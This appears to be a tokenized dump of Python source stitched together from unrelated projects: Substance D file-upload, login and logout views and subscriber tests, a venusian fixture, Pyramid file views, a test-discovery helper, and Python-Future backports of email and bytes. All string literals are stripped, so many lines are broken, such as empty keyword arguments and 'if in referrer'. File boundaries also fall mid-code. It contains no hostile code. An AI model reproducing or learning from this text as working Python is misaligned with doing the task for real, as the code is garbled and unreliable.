\n 
~~ ~~ class DummyEvent ( object ) : \n 
~~~ def __init__ ( self , loads = 0 , stores = 0 ) : \n 
~~~ self . request = testing . DummyRequest ( ) \n 
self . conn = DummyConnection ( loads , stores ) \n 
~~ ~~ import pkg_resources \n 
import mimetypes \n 
import colander \n 
import deform . schema \n 
\n 
from pyramid . httpexceptions import HTTPFound \n 
from pyramid . response import Response \n 
from pyramid . security import NO_PERMISSION_REQUIRED \n 
\n 
from . . form import FormView \n 
\n 
from . . file import ( \n 
FilePropertiesSchema , \n 
FileUploadTempStore , \n 
file_upload_widget , \n 
file_name_node , \n 
USE_MAGIC , \n 
) \n 
\n 
from . . interfaces import ( \n 
IFile , \n 
IFolder , \n 
) \n 
\n 
from . . sdi import mgmt_view \n 
\n 
@ mgmt_view ( \n 
context = IFile , \n 
name = , \n 
permission = , \n 
tab_condition = False , \n 
http_cache = 0 , \n 
) \n 
def view_file ( context , request ) : \n 
~~~ return context . get_response ( request = request ) \n 
\n 
~~ @ mgmt_view ( \n 
context = IFile , \n 
name = , \n 
tab_title = , \n 
permission = \n 
) \n 
def view_tab ( context , request ) : \n 
~~~ return HTTPFound ( location = request . sdiapi . mgmt_path ( context ) ) \n 
\n 
~~ class AddFileSchema ( FilePropertiesSchema ) : \n 
~~~ file = colander . SchemaNode ( \n 
deform . schema . FileData ( ) , \n 
widget = file_upload_widget , \n 
missing = colander . null , \n 
) \n 
\n 
~~ @ colander . deferred \n 
def name_or_file ( node , kw ) : \n 
~~~ def _name_or_file ( node , struct ) : \n 
~~~ if not struct [ ] and not struct [ ] : \n 
~~~ raise colander . Invalid ( node , ) \n 
~~ if not struct [ ] : \n 
~~~ filename = struct [ ] . get ( ) \n 
if filename : \n 
~~~ name_node = file_name_node . bind ( \n 
context = kw [ ] , request = kw [ ] \n 
) \n 
name_node . validator ( node [ ] , filename ) \n 
~~ else : \n 
~~~ raise colander . Invalid ( \n 
node , \n 
\n 
) \n 
~~ ~~ ~~ return _name_or_file \n 
\n 
~~ @ mgmt_view ( \n 
context = IFolder , \n 
name = , \n 
tab_title = , \n 
permission = , \n 
renderer = , \n 
addable_content = , \n 
tab_condition = False \n 
) \n 
class AddFileView ( FormView ) : \n 
~~~ title = \n 
schema = AddFileSchema ( validator = name_or_file ) . clone ( ) \n 
schema [ ] . missing = colander . null \n 
schema [ ] . missing = colander . null \n 
buttons = ( , ) \n 
\n 
def _makeob ( self , stream , title , mimetype ) : \n 
~~~ return self . request . registry . content . create ( \n 
, \n 
stream = stream , \n 
mimetype = mimetype , \n 
title = title , \n 
) \n 
\n 
~~ def add_success ( self , appstruct ) : \n 
~~~ name = appstruct [ ] \n 
title = appstruct [ ] or None \n 
filedata = appstruct [ ] \n 
mimetype = appstruct [ ] or USE_MAGIC \n 
stream = None \n 
filename = None \n 
if filedata : \n 
~~~ filename = filedata [ ] \n 
stream = filedata [ ] \n 
if stream : \n 
~~~ stream . seek ( 0 ) \n 
~~ else : \n 
~~~ stream = None \n 
~~ ~~ name = name or filename \n 
fileob = self . _makeob ( stream , title , mimetype ) \n 
self . context [ name ] = fileob \n 
tmpstore = FileUploadTempStore ( self . request ) \n 
tmpstore . clear ( ) \n 
return HTTPFound ( self . request . sdiapi . mgmt_path ( self . context ) ) \n 
\n 
~~ ~~ onepixel = pkg_resources . resource_filename ( \n 
, ) \n 
\n 
\n 
# which the user would have to put there anyway \n 
@ mgmt_view ( \n 
name = , \n 
tab_condition = False , \n 
permission = NO_PERMISSION_REQUIRED \n 
) \n 
def preview_image_upload ( request ) : \n 
~~~ uid = request . subpath [ 0 ] \n 
tempstore = FileUploadTempStore ( request ) \n 
filedata = tempstore . get ( uid , { } ) \n 
fp = filedata . get ( ) \n 
filename = \n 
if fp is not None : \n 
~~~ fp . seek ( 0 ) \n 
filename = filedata [ ] \n 
~~ mimetype = mimetypes . guess_type ( filename , strict = False ) [ 0 ] \n 
if not mimetype or not mimetype . startswith ( ) : \n 
~~~ mimetype = \n 
fp = open ( onepixel , ) \n 
~~ response = Response ( content_type = mimetype , app_iter = fp ) \n 
return response \n 
~~ import unittest \n 
from pyramid import testing \n 
\n 
class Test_principal_added ( unittest . TestCase ) : \n 
~~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import principal_added \n 
return principal_added ( event ) \n 
\n 
~~ def test_event_wo_loading_attr ( self ) : \n 
~~~ event = testing . DummyResource ( ) \n 
event . object = testing . DummyResource ( ) \n 
self . assertRaises ( AttributeError , self . _callFUT , event ) \n 
\n 
~~ def test_event_w_loading_True ( self ) : \n 
~~~ event = testing . DummyResource ( loading = True ) \n 
result = self . _callFUT ( event ) \n 
self . assertEqual ( result , None ) \n 
\n 
~~ def test_wo_principals_service ( self ) : \n 
~~~ from zope . interface import directlyProvides \n 
from ... interfaces import IFolder \n 
event = testing . DummyResource ( loading = False ) \n 
root = testing . DummyResource ( ) \n 
directlyProvides ( root , IFolder ) \n 
event . object = root [ ] = testing . DummyResource ( ) \n 
self . assertRaises ( ValueError , self . _callFUT , event ) \n 
\n 
~~ def test_user_not_in_groups ( self ) : \n 
~~~ from ... testing import make_site \n 
from ... interfaces import IUser \n 
site = make_site ( ) \n 
user = testing . DummyResource ( __provides__ = IUser ) \n 
site [ ] = user \n 
event = testing . DummyResource ( object = user , loading = False ) \n 
self . _callFUT ( event ) # doesnt blow up \n 
\n 
~~ def test_user_in_groups ( self ) : \n 
~~~ from ... testing import make_site \n 
from ... interfaces import IUser \n 
site = make_site ( ) \n 
groups = site [ ] [ ] \n 
groups [ ] = testing . DummyResource ( ) \n 
user = testing . DummyResource ( __provides__ = IUser ) \n 
site [ ] = user \n 
event = testing . DummyResource ( object = user , loading = False ) \n 
self . assertRaises ( ValueError , self . _callFUT , event ) \n 
\n 
~~ def test_group_not_in_users ( self ) : \n 
~~~ from ... testing import make_site \n 
site = make_site ( ) \n 
group = testing . DummyResource ( ) \n 
site [ ] = group \n 
event = testing . DummyResource ( object = group , loading = False ) \n 
self . _callFUT ( event ) # doesnt blow up \n 
\n 
~~ def test_group_in_users ( self ) : \n 
~~~ from ... testing import make_site \n 
site = make_site ( ) \n 
users = site [ ] [ ] \n 
users [ ] = testing . DummyResource ( ) \n 
group = testing . DummyResource ( ) \n 
site [ ] = group \n 
event = testing . DummyResource ( object = group , loading = False ) \n 
self . assertRaises ( ValueError , self . _callFUT , event ) \n 
\n 
~~ ~~ class Test_user_will_be_removed ( unittest . TestCase ) : \n 
~~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import user_will_be_removed \n 
return user_will_be_removed ( event ) \n 
\n 
~~ def test_loading ( self ) : \n 
~~~ event = testing . DummyResource ( loading = True , moving = None ) \n 
result = self . _callFUT ( event ) \n 
self . assertEqual ( result , None ) \n 
\n 
~~ def test_moving ( self ) : \n 
~~~ event = testing . DummyResource ( loading = False , moving = True ) \n 
result = self . _callFUT ( event ) \n 
self . assertEqual ( result , None ) \n 
\n 
~~ def test_it ( self ) : \n 
~~~ from ... interfaces import IFolder \n 
parent = testing . DummyResource ( __provides__ = IFolder ) \n 
user = testing . DummyResource ( ) \n 
reset = testing . DummyResource ( ) \n 
def commit_suicide ( ) : \n 
~~~ reset . committed = True \n 
~~ reset . commit_suicide = commit_suicide \n 
objectmap = DummyObjectMap ( ( reset , ) ) \n 
parent . __objectmap__ = objectmap \n 
parent [ ] = user \n 
event = testing . DummyResource ( object = user , loading = False , moving = None ) \n 
self . _callFUT ( event ) \n 
self . assertTrue ( reset . committed ) \n 
\n 
~~ def test_it_moving ( self ) : \n 
~~~ event = testing . DummyResource ( object = None , loading = False ) \n 
event . moving = True \n 
self . assertEqual ( self . _callFUT ( event ) , None ) \n 
\n 
~~ ~~ class Test_user_added ( unittest . TestCase ) : \n 
~~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import user_added \n 
return user_added ( event ) \n 
\n 
~~ def test_loading ( self ) : \n 
~~~ event = testing . DummyResource ( loading = True ) \n 
result = self . _callFUT ( event ) \n 
self . assertEqual ( result , None ) \n 
\n 
~~ def test_it_user_has_no_oid ( self ) : \n 
~~~ user = testing . DummyResource ( ) \n 
event = testing . DummyResource ( object = user , loading = False ) \n 
event . registry = DummyRegistry ( ) \n 
self . assertRaises ( AttributeError , self . _callFUT , event ) \n 
\n 
~~ def test_it ( self ) : \n 
~~~ from pyramid . security import Allow \n 
user = testing . DummyResource ( ) \n 
user . __oid__ = 1 \n 
event = testing . DummyResource ( object = user , loading = False ) \n 
event . registry = DummyRegistry ( ) \n 
self . _callFUT ( event ) \n 
self . assertEqual ( \n 
user . __acl__ , \n 
[ ( Allow , 1 , ( , \n 
, \n 
, \n 
) ) ] ) \n 
\n 
~~ ~~ class Test_acl_maybe_added ( unittest . TestCase ) : \n 
~~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import acl_maybe_added \n 
return acl_maybe_added ( event ) \n 
\n 
~~ def test_moving ( self ) : \n 
~~~ event = DummyEvent ( moving = True , loading = False ) \n 
self . assertEqual ( self . _callFUT ( event ) , False ) \n 
\n 
~~ def test_loading ( self ) : \n 
~~~ event = DummyEvent ( moving = None , loading = True ) \n 
self . assertEqual ( self . _callFUT ( event ) , False ) \n 
\n 
~~ def test_objectmap_is_None ( self ) : \n 
~~~ event = DummyEvent ( moving = None , object = None , loading = False ) \n 
self . assertEqual ( self . _callFUT ( event ) , None ) \n 
\n 
~~ def test_no_acls ( self ) : \n 
~~~ from substanced . interfaces import IFolder \n 
resource1 = testing . DummyResource ( __provides__ = IFolder ) \n 
resource2 = testing . DummyResource ( ) \n 
resource1 [ ] = resource2 \n 
objectmap = DummyObjectMap ( ) \n 
resource1 . __objectmap__ = objectmap \n 
event = DummyEvent ( moving = None , object = resource1 , loading = False ) \n 
self . _callFUT ( event ) \n 
self . assertEqual ( objectmap . connections , [ ] ) \n 
\n 
~~ def test_with_acls ( self ) : \n 
~~~ from ... interfaces import PrincipalToACLBearing \n 
from substanced . interfaces import IFolder \n 
resource1 = testing . DummyResource ( __provides__ = IFolder ) \n 
resource2 = testing . DummyResource ( ) \n 
resource1 [ ] = resource2 \n 
resource1 . __acl__ = [ ( None , , None ) , ( None , 1 , None ) ] \n 
resource2 . __acl__ = [ ( None , , None ) , ( None , 2 , None ) ] \n 
objectmap = DummyObjectMap ( ) \n 
resource1 . __objectmap__ = objectmap \n 
event = DummyEvent ( moving = None , object = resource1 , loading = False ) \n 
self . _callFUT ( event ) \n 
self . assertEqual ( \n 
objectmap . connections , \n 
[ ( 2 , resource2 , PrincipalToACLBearing ) , \n 
( 1 , resource1 , PrincipalToACLBearing ) ] \n 
) \n 
\n 
~~ ~~ class Test_acl_modified ( unittest . TestCase ) : \n 
~~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import acl_modified \n 
return acl_modified ( event ) \n 
\n 
~~ def test_objectmap_is_None ( self ) : \n 
~~~ event = DummyEvent ( object = None ) \n 
self . assertEqual ( self . _callFUT ( event ) , None ) \n 
\n 
~~ def test_gardenpath ( self ) : \n 
~~~ from ... interfaces import PrincipalToACLBearing \n 
resource = testing . DummyResource ( ) \n 
objectmap = DummyObjectMap ( ) \n 
resource . __objectmap__ = objectmap \n 
event = DummyEvent ( \n 
object = resource , \n 
new_acl = [ ( None , , None ) , ( None , 1 , None ) ] , \n 
old_acl = [ ( None , , None ) , ( None , 2 , None ) ] , \n 
) \n 
self . _callFUT ( event ) \n 
self . assertEqual ( \n 
objectmap . connections , \n 
[ ( 1 , resource , PrincipalToACLBearing ) ] \n 
) \n 
self . assertEqual ( \n 
objectmap . disconnections , \n 
[ ( 2 , resource , PrincipalToACLBearing ) ] \n 
) \n 
\n 
\n 
~~ ~~ class DummyObjectMap ( object ) : \n 
~~~ def __init__ ( self , result = ( ) ) : \n 
~~~ self . result = result \n 
self . connections = [ ] \n 
self . disconnections = [ ] \n 
\n 
~~ def targets ( self , object , reftype ) : \n 
~~~ return self . result \n 
\n 
~~ def connect ( self , source , target , reftype ) : \n 
~~~ self . connections . append ( ( source , target , reftype ) ) \n 
\n 
~~ def disconnect ( self , source , target , reftype ) : \n 
~~~ self . disconnections . append ( ( source , target , reftype ) ) \n 
\n 
~~ ~~ class DummyEvent ( object ) : \n 
~~~ def __init__ ( self , ** kw ) : \n 
~~~ self . __dict__ . update ( kw ) \n 
\n 
~~ ~~ class DummyRegistry ( object ) : \n 
~~~ def subscribers ( self , * arg ) : \n 
~~~ return \n 
\n 
~~ ~~ from pyramid . httpexceptions import ( \n 
HTTPForbidden , \n 
HTTPFound \n 
) \n 
from pyramid . renderers import get_renderer \n 
from pyramid . session import check_csrf_token \n 
from pyramid . security import ( \n 
remember , \n 
forget , \n 
Authenticated , \n 
NO_PERMISSION_REQUIRED , \n 
) \n 
\n 
from ... util import get_oid \n 
\n 
from . . import mgmt_view \n 
\n 
from substanced . interfaces import IUserLocator \n 
from substanced . principal import DefaultUserLocator \n 
from substanced . event import LoggedIn \n 
\n 
@ mgmt_view ( \n 
name = , \n 
renderer = , \n 
tab_condition = False , \n 
permission = NO_PERMISSION_REQUIRED \n 
) \n 
@ mgmt_view ( \n 
renderer = , \n 
context = HTTPForbidden , \n 
permission = NO_PERMISSION_REQUIRED , \n 
tab_condition = False \n 
) \n 
@ mgmt_view ( \n 
renderer = , \n 
context = HTTPForbidden , \n 
permission = NO_PERMISSION_REQUIRED , \n 
effective_principals = Authenticated , \n 
tab_condition = False \n 
) \n 
def login ( context , request ) : \n 
~~~ login_url = request . sdiapi . mgmt_path ( request . context , ) \n 
referrer = request . url \n 
if in referrer : \n 
\n 
# auditstream sse view, bail.  Otherwise the came_from will be set to \n 
# the auditstream URL, and the user who this happens to will eventually \n 
\n 
# they see e.g. "id: 0-10\\ndata: " when they log in successfully. \n 
~~~ return HTTPForbidden ( ) \n 
~~ if login_url in referrer : \n 
# never use the login form itself as came_from \n 
~~~ referrer = request . sdiapi . mgmt_path ( request . virtual_root ) \n 
~~ came_from = request . session . setdefault ( , referrer ) \n 
login = \n 
password = \n 
if in request . params : \n 
~~~ try : \n 
~~~ check_csrf_token ( request ) \n 
~~ except : \n 
~~~ request . sdiapi . flash ( , ) \n 
~~ else : \n 
~~~ login = request . params [ ] \n 
password = request . params [ ] \n 
adapter = request . registry . queryMultiAdapter ( \n 
( context , request ) , \n 
IUserLocator \n 
) \n 
if adapter is None : \n 
~~~ adapter = DefaultUserLocator ( context , request ) \n 
~~ user = adapter . get_user_by_login ( login ) \n 
if user is not None and user . check_password ( password ) : \n 
~~~ request . session . pop ( , None ) \n 
headers = remember ( request , get_oid ( user ) ) \n 
request . registry . notify ( LoggedIn ( login , user , context , request ) ) \n 
return HTTPFound ( location = came_from , headers = headers ) \n 
~~ request . sdiapi . flash ( , ) \n 
\n 
# Pass this through FBO views (e.g., forbidden) which use its macros. \n 
~~ ~~ template = get_renderer ( \n 
) . implementation ( ) \n 
return dict ( \n 
url = request . sdiapi . mgmt_path ( request . virtual_root , ) , \n 
came_from = came_from , \n 
login = login , \n 
password = password , \n 
login_template = template , \n 
) \n 
\n 
~~ @ mgmt_view ( \n 
name = , \n 
tab_condition = False , \n 
permission = NO_PERMISSION_REQUIRED \n 
) \n 
def logout ( request ) : \n 
~~~ headers = forget ( request ) \n 
return HTTPFound ( location = request . sdiapi . mgmt_path ( request . context ) , \n 
headers = headers ) \n 
~~ from venusian . tests . fixtures import categorydecorator \n 
from venusian . tests . fixtures import categorydecorator2 \n 
\n 
@ categorydecorator ( function = True ) \n 
def function ( request ) : # pragma: no cover \n 
~~~ return request \n 
\n 
~~ @ categorydecorator2 ( function = True ) \n 
def function2 ( request ) : # pragma: no cover \n 
~~~ return request \n 
~~ import os \n 
import mimetypes \n 
\n 
mimetypes . add_type ( , ) \n 
mimetypes . add_type ( , ) \n 
\n 
from zope . structuredtext import stx2html \n 
\n 
from pyramid . response import Response \n 
from pyramid . httpexceptions import HTTPFound \n 
\n 
from pyramid . view import render_view_to_response \n 
from pyramid . view import view_config \n 
\n 
from virginia . models import File \n 
from virginia . models import Directory \n 
\n 
# default views: router will call these  \n 
\n 
@ view_config ( context = File ) \n 
def file_view ( context , request ) : \n 
~~~ dirname , filename = os . path . split ( context . path ) \n 
name , ext = os . path . splitext ( filename ) \n 
result = render_view_to_response ( context , request , ext ) \n 
return result \n 
\n 
~~ @ view_config ( context = Directory ) \n 
def directory_view ( context , request ) : \n 
~~~ path_info = request . environ [ ] \n 
if not path_info . endswith ( ) : \n 
~~~ response = HTTPFound ( location = path_info + ) \n 
return response \n 
\n 
~~ defaults = ( , , ) \n 
for name in defaults : \n 
~~~ try : \n 
~~~ index = context [ name ] \n 
~~ except KeyError : \n 
~~~ continue \n 
~~ return file_view ( index , request ) \n 
~~ response = Response ( % context . path ) \n 
response . content_type = \n 
return response \n 
\n 
# custom views: FileView will call these \n 
\n 
~~ @ view_config ( context = File , name = ) \n 
def structured_text_view ( context , request ) : \n 
~~~ """ Filesystem-based STX view\n    """ \n 
result = stx2html ( context . source ) \n 
response = Response ( result ) \n 
response . content_type = \n 
return response \n 
\n 
~~ @ view_config ( context = File , name = ) \n 
@ view_config ( context = File , name = ) \n 
@ view_config ( context = File , name = ) \n 
@ view_config ( context = File , name = ) \n 
def raw_view ( context , request ) : \n 
~~~ """ Just return the source raw.\n    """ \n 
response = Response ( context . source ) \n 
dirname , filename = os . path . split ( context . path ) \n 
name , ext = os . path . splitext ( filename ) \n 
mt , encoding = mimetypes . guess_type ( filename ) \n 
response . content_type = mt or \n 
return response \n 
~~ """\nSimple auto test discovery.\n\nFrom http://stackoverflow.com/a/17004409\n""" \n 
import os \n 
import sys \n 
import unittest \n 
\n 
if not hasattr ( unittest . defaultTestLoader , ) : \n 
~~~ try : \n 
~~~ import unittest2 as unittest \n 
~~ except ImportError : \n 
~~~ raise ImportError ( ) \n 
\n 
~~ ~~ def additional_tests ( ) : \n 
~~~ setup_file = sys . modules [ ] . __file__ \n 
setup_dir = os . path . abspath ( os . path . dirname ( setup_file ) ) \n 
test_dir = os . path . join ( setup_dir , ) \n 
test_suite = unittest . defaultTestLoader . discover ( test_dir ) \n 
blacklist = [ ] \n 
if in __file__ : \n 
# Skip some tests that fail on travis-ci \n 
~~~ blacklist . append ( ) \n 
~~ return exclude_tests ( test_suite , blacklist ) \n 
\n 
\n 
~~ class SkipCase ( unittest . TestCase ) : \n 
~~~ def skeleton_run_test ( self ) : \n 
~~~ raise unittest . SkipTest ( "Test fails spuriously on travis-ci" ) \n 
\n 
\n 
~~ ~~ def exclude_tests ( suite , blacklist ) : \n 
~~~ """\n    Example:\n    \n    blacklist = [\n        \'test_some_test_that_should_be_skipped\',\n        \'test_another_test_that_should_be_skipped\'\n    ]\n    """ \n 
new_suite = unittest . TestSuite ( ) \n 
\n 
for test_group in suite . _tests : \n 
~~~ for test in test_group : \n 
~~~ if not hasattr ( test , ) : \n 
# e.g. ModuleImportFailure \n 
~~~ new_suite . addTest ( test ) \n 
continue \n 
~~ for subtest in test . _tests : \n 
~~~ method = subtest . _testMethodName \n 
if method in blacklist : \n 
~~~ setattr ( test , \n 
method , \n 
getattr ( SkipCase ( ) , ) ) \n 
~~ ~~ new_suite . addTest ( test ) \n 
~~ ~~ return new_suite \n 
\n 
# Copyright (C) 2001-2007 Python Software Foundation \n 
# Author: Barry Warsaw \n 
# Contact: email-sig@python.org \n 
\n 
~~ """\nBackport of the Python 3.3 email package for Python-Future.\n\nA package for parsing, handling, and generating email messages.\n""" \n 
from __future__ import unicode_literals \n 
from __future__ import division \n 
from __future__ import absolute_import \n 
\n 
# Install the surrogate escape handler here because this is used by many \n 
# modules in the email package. \n 
from future . utils import surrogateescape \n 
surrogateescape . register_surrogateescape ( ) \n 
# (Should this be done globally by ``future``?) \n 
\n 
\n 
__version__ = \n 
\n 
__all__ = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
] \n 
\n 
\n 
\n 
\n 
# of importing email since those cascadingly import most of the rest of the \n 
# email package. \n 
def message_from_string ( s , * args , ** kws ) : \n 
~~~ """Parse a string into a Message object model.\n\n    Optional _class and strict are passed to the Parser constructor.\n    """ \n 
from future . backports . email . parser import Parser \n 
return Parser ( * args , ** kws ) . parsestr ( s ) \n 
\n 
~~ def message_from_bytes ( s , * args , ** kws ) : \n 
~~~ """Parse a bytes string into a Message object model.\n\n    Optional _class and strict are passed to the Parser constructor.\n    """ \n 
from future . backports . email . parser import BytesParser \n 
return BytesParser ( * args , ** kws ) . parsebytes ( s ) \n 
\n 
~~ def message_from_file ( fp , * args , ** kws ) : \n 
~~~ """Read a file and parse its contents into a Message object model.\n\n    Optional _class and strict are passed to the Parser constructor.\n    """ \n 
from future . backports . email . parser import Parser \n 
return Parser ( * args , ** kws ) . parse ( fp ) \n 
\n 
~~ def message_from_binary_file ( fp , * args , ** kws ) : \n 
~~~ """Read a binary file and parse its contents into a Message object model.\n\n    Optional _class and strict are passed to the Parser constructor.\n    """ \n 
from future . backports . email . parser import BytesParser \n 
return BytesParser ( * args , ** kws ) . parse ( fp ) \n 
~~ \n 
\n 
_builtin_next = next \n 
\n 
_SENTINEL = object ( ) \n 
\n 
def newnext ( iterator , default = _SENTINEL ) : \n 
~~~ """\n    next(iterator[, default])\n    \n    Return the next item from the iterator. If default is given and the iterator\n    is exhausted, it is returned instead of raising StopIteration.\n    """ \n 
\n 
# args = [] \n 
# if default is not _SENTINEL: \n 
#     args.append(default) \n 
try : \n 
~~~ try : \n 
~~~ return iterator . __next__ ( ) \n 
~~ except AttributeError : \n 
~~~ try : \n 
~~~ return iterator . next ( ) \n 
~~ except AttributeError : \n 
~~~ raise TypeError ( "\'{0}\' object is not an iterator" . format ( \n 
iterator . __class__ . __name__ ) ) \n 
~~ ~~ ~~ except StopIteration as e : \n 
~~~ if default is _SENTINEL : \n 
~~~ raise e \n 
~~ else : \n 
~~~ return default \n 
\n 
\n 
~~ ~~ ~~ __all__ = [ ] \n 
\n 
from __future__ import absolute_import \n 
\n 
from future . utils import PY2 \n 
\n 
from sys import * \n 
\n 
if PY2 : \n 
~~~ from __builtin__ import intern \n 
~~ """\nPure-Python implementation of a Python 3-like bytes object for Python 2.\n\nWhy do this? Without it, the Python 2 bytes object is a very, very\ndifferent beast to the Python 3 bytes object.\n""" \n 
\n 
from collections import Iterable \n 
from numbers import Integral \n 
import string \n 
\n 
from future . utils import istext , isbytes , PY3 , with_metaclass \n 
from future . types import no , issubset \n 
from future . types . newobject import newobject \n 
\n 
\n 
_builtin_bytes = bytes \n 
\n 
if PY3 : \n 
\n 
~~~ unicode = str \n 
\n 
\n 
~~ class BaseNewBytes ( type ) : \n 
~~~ def __instancecheck__ ( cls , instance ) : \n 
~~~ if cls == newbytes : \n 
~~~ return isinstance ( instance , _builtin_bytes ) \n 
~~ else : \n 
~~~ return issubclass ( instance . __class__ , cls ) \n 
\n 
\n 
~~ ~~ ~~ class newbytes ( with_metaclass ( BaseNewBytes , _builtin_bytes ) ) : \n 
~~~ """\n    A backport of the Python 3 bytes object to Py2\n    """ \n 
def __new__ ( cls , * args , ** kwargs ) : \n 
~~~ """\n        From the Py3 bytes docstring:\n\n        bytes(iterable_of_ints) -> bytes\n        bytes(string, encoding[, errors]) -> bytes\n        bytes(bytes_or_buffer) -> immutable copy of bytes_or_buffer\n        bytes(int) -> bytes object of size given by the parameter initialized with null bytes\n        bytes() -> empty bytes object\n        \n        Construct an immutable array of bytes from:\n          - an iterable yielding integers in range(256)\n          - a text string encoded using the specified encoding\n          - any object implementing the buffer API.\n          - an integer\n        """ \n 
\n 
encoding = None \n 
errors = None \n 
\n 
if len ( args ) == 0 : \n 
~~~ return super ( newbytes , cls ) . __new__ ( cls ) \n 
~~ elif len ( args ) >= 2 : \n 
~~~ args = list ( args ) \n 
if len ( args ) == 3 : \n 
~~~ errors = args . pop ( ) \n 
~~ encoding = args . pop ( ) \n 
# Was: elif isinstance(args[0], newbytes): \n 
\n 
# this to be True for all unicode string subclasses. Warning: \n 
# This may render newstr un-subclassable. \n 
~~ if type ( args [ 0 ] ) == newbytes : \n 
# Special-case: for consistency with Py3.3, we return the same object \n 
# (with the same id) if a newbytes object is passed into the \n 
# newbytes constructor. \n 
~~~ return args [ 0 ] \n 
~~ elif isinstance ( args [ 0 ] , _builtin_bytes ) : \n 
~~~ value = args [ 0 ] \n 
~~ elif isinstance ( args [ 0 ] , unicode ) : \n 
~~~ try : \n 
~~~ if in kwargs : \n 
~~~ assert encoding is None \n 
encoding = kwargs [ ] \n 
~~ if in kwargs : \n 
~~~ assert errors is None \n 
errors = kwargs [ ] \n 
~~ ~~ except AssertionError : \n 
~~~ raise TypeError ( ) \n 
~~ if encoding is None : \n 
~~~ raise TypeError ( ) \n 
### \n 
# Was:   value = args[0].encode(**kwargs) \n 
\n 
# Use this instead: \n 
~~ newargs = [ encoding ] \n 
if errors is not None : \n 
~~~ newargs . append ( errors ) \n 
~~ value = args [ 0 ] . encode ( * newargs ) \n 
###  \n 
~~ elif isinstance ( args [ 0 ] , Iterable ) : \n 
~~~ if len ( args [ 0 ] ) == 0 : \n 
\n 
~~~ value = \n 
~~ else : \n 
# Was: elif len(args[0])>0 and isinstance(args[0][0], Integral): \n 
\n 
\n 
# anyway. \n 
~~~ try : \n 
~~~ values = [ chr ( x ) for x in args [ 0 ] ] \n 
value = . join ( values ) \n 
~~ except : \n 
~~~ raise ValueError ( ) \n 
~~ ~~ ~~ elif isinstance ( args [ 0 ] , Integral ) : \n 
~~~ if args [ 0 ] < 0 : \n 
~~~ raise ValueError ( ) \n 
~~ value = * args [ 0 ] \n 
~~ else : \n 
~~~ value = args [ 0 ] \n 
~~ return super ( newbytes , cls ) . __new__ ( cls , value ) \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return + super ( newbytes , self ) . __repr__ ( ) \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return + "\'{0}\'" . format ( super ( newbytes , self ) . __str__ ( ) ) \n 
\n 
~~ def __getitem__ ( self , y ) : \n 
~~~ value = super ( newbytes , self ) . __getitem__ ( y ) \n 
if isinstance ( y , Integral ) : \n 
~~~ return ord ( value ) \n 
~~ else : \n 
~~~ return newbytes ( value ) \n 
\n 
~~ ~~ def __getslice__ ( self , * args ) : \n 
~~~ return self . __getitem__ ( slice ( * args ) ) \n 
\n 
~~ def __contains__ ( self , key ) : \n 
~~~ if isinstance ( key , int ) : \n 
~~~ newbyteskey = newbytes ( [ key ] ) \n 
\n 
# newbytes, not Python 2 str: \n 
~~ elif type ( key ) == newbytes : \n 
~~~ newbyteskey = key \n 
~~ else : \n 
~~~ newbyteskey = newbytes ( key ) \n 
~~ return issubset ( list ( newbyteskey ) , list ( self ) ) \n 
\n 
~~ @ no ( unicode ) \n 
def __add__ ( self , other ) : \n 
~~~ return newbytes ( super ( newbytes , self ) . __add__ ( other ) ) \n 
\n 
~~ @ no ( unicode ) \n 
def __radd__ ( self , left ) : \n 
~~~ return newbytes ( left ) + self \n 
\n 
~~ @ no ( unicode ) \n 
def __mul__ ( self , other ) : \n 
~~~ return newbytes ( super ( newbytes , self ) . __mul__ ( other ) ) \n 
\n 
~~ @ no ( unicode ) \n 
def __rmul__ ( self , other ) : \n 
~~~ return newbytes ( super ( newbytes , self ) . __rmul__ ( other ) ) \n 
\n 
~~ def join ( self , iterable_of_bytes ) : \n 
~~~ errmsg = \n 
if isbytes ( iterable_of_bytes ) or istext ( iterable_of_bytes ) : \n 
~~~ raise TypeError ( errmsg . format ( 0 , type ( iterable_of_bytes ) ) ) \n 
~~ for i , item in enumerate ( iterable_of_bytes ) : \n 
~~~ if istext ( item ) : \n 
~~~ raise TypeError ( errmsg . format ( i , type ( item ) ) ) \n 
~~ ~~ return newbytes ( super ( newbytes , self ) . join ( iterable_of_bytes ) ) \n 
\n 
~~ @ classmethod \n 
def fromhex ( cls , string ) : \n 
# Only on Py2: \n 
~~~ return cls ( string . replace ( , ) . decode ( ) ) \n 
\n 
~~ @ no ( unicode ) \n 
def find ( self , sub , * args ) : \n 
~~~ return super ( newbytes , self ) . find ( sub , * args ) \n 
\n 
~~ @ no ( unicode ) \n 
def rfind ( self , sub , * args ) : \n 
~~~ return super ( newbytes , self ) . rfind ( sub , * args ) \n 
\n 
~~ @ no ( unicode , ( 1 , 2 ) ) \n 
def replace ( self , old , new , * args ) : \n 
~~~ return newbytes ( super ( newbytes , self ) . replace ( old , new , * args ) ) \n 
\n 
~~ def encode ( self , * args ) : \n 
~~~ raise AttributeError ( "encode method has been disabled in newbytes" ) \n 
\n 
~~ def decode ( self , encoding = , errors = ) : \n 
~~~ """\n        Returns a newstr (i.e. unicode subclass)\n\n        Decode B using the codec registered for encoding. Default encoding\n        is \'utf-8\'. errors may be given to set a different error\n        handling scheme.  Default is \'strict\' meaning that encoding errors raise\n        a UnicodeDecodeError.  Other possible values are \'ignore\' and \'replace\'\n        as well as any other name registered with codecs.register_error that is\n        able to handle UnicodeDecodeErrors.\n        """ \n 
# Py2 str.encode() takes encoding and errors as optional parameter, \n 
# not keyword arguments as in Python 3 str. \n 
\n 
from future . types . newstr import newstr \n 
\n 
if errors == : \n 
~~~ from future . utils . surrogateescape import register_surrogateescape \n 
register_surrogateescape ( ) \n 
\n 
~~ return newstr ( super ( newbytes , self ) . decode ( encoding , errors ) ) \n 
\n 
# This is currently broken: \n 
# # We implement surrogateescape error handling here in addition rather \n 
# # than relying on the custom error handler from \n 
# # future.utils.surrogateescape to be registered globally, even though \n 
# # that is fine in the case of decoding. (But not encoding: see the \n 
# # comments in newstr.encode()``.) \n 
# \n 
\n 
#     # Decode char by char \n 
